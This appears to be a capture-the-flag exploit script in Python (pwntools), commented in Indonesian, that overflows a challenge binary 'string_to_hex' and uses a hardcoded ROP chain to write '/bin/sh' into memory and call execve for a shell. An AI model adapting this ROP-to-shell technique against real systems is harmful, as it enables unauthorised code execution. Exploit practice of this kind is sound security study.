from pwn import *
elf = ELF("./string_to_hex")
def main():
    r = elf.process()
    offset = 296
    # gadget
    pop_rax = 0x000000000048be70 # sys_execve(
    pop_rdi = 0x0000000000400535 # address /bin/sh
    pop_rsi = 0x0000000000401667 # 0
    pop_rdx = 0x0000000000434b65 # 0
    mov_rsi_rax = 0x0000000000461571
    xor_rax_rax = 0x000000000041a16f
    add_rax_3 = 0x00000000004553d0
    add_rax_2 = 0x00000000004553b7
    syscalls = 0x0000000000455f05

    # section
    section_data = 0x00000000006b2080

    p = ""
    p += "A" * offset

    # taro /bin/sh di rax , dan data di rsi
    p += p64(pop_rax)
    p += "/bin/sh#"
    p += p64(pop_rsi)
    p += p64(section_data)
    p += p64(mov_rsi_rax)

    # hapus padding , si X
    p += p64(xor_rax_rax)
    p += p64(pop_rsi)
    p += p64(section_data + 7) # /bin/shX == (X => index ke 7)
    p += p64(mov_rsi_rax)

    # atur RDI ke /bin/sh yg kita simpan di data tadi
    p += p64(pop_rdi)
    p += p64(section_data)

    # atur RDX = 0
    p += p64(pop_rdx)
    p += p64(section_data + 7)

    # atur RSI = 0
    p += p64(add_rax_3) * 19
    p += p64(add_rax_2)

    p += p64(syscalls)

    r.sendline(p)
    r.interactive()




if __name__ == '__main__':
    main()
